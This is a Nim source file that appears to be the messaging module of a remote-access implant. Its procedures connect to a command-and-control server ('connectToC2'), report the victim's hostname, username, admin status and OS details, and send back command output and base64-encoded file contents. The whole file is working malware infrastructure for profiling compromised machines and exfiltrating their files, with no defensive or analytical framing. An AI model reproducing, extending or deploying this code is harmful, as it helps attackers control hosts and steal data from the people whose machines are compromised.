import net, base64, json

proc sendData(client: Socket, data: string) =
  client.send(encode(data) & "\r\n")

proc sendOutput*(client: Socket, taskId: int, category: string, output: string, error: string = "") =
  let j = %*
    {
      "task": "output",
      "taskId": taskId,
      "error": error,
      "data": {
        "category": category,
        "output": encode(output)
      }
    }
  client.sendData($j)

proc identify*(client: Socket, taskId: int, hostname: string, isAdmin: bool, username: string, osType: string,
              windowsVersionInfo: tuple[majorVersion: int, minorVersion: int, buildNumber: int],
              linuxVersionInfo: tuple[kernelVersion: string], ownIntegrity: string) =
  let j = %*
    {
      "task": "identify",
      "taskId": taskId,
      "error": "",
      "data": {
        "hostname": hostname,
        "isAdmin": isAdmin,
        "username": username,
        "osType": osType,
        "ownIntegrity": ownIntegrity,
        "windowsOsVersionInfo": {
          "majorVersion": windowsVersionInfo.majorVersion,
          "minorVersion": windowsVersionInfo.minorVersion,
          "buildNumber": windowsVersionInfo.buildNumber,
        },
        "linuxOsVersionInfo": {
          "kernelVersion": linuxVersionInfo.kernelVersion
        }
      }
    }
  client.sendData($j)

proc connectToC2*(client: Socket) =
  let j = %*
    {
      "task": "connect",
      "taskId": -1,
      "error": "",
      "data": {}
    }
  client.sendData($j)

proc sendFile*(client: Socket, taskId: int, path: string, b64c: string, error: string = "") =
  let j = %*
    {
      "task": "file",
      "taskId": taskId,
      "error": error,
      "data": {
        "path": path,
        "contents": b64c
      }
    }
  client.sendData($j)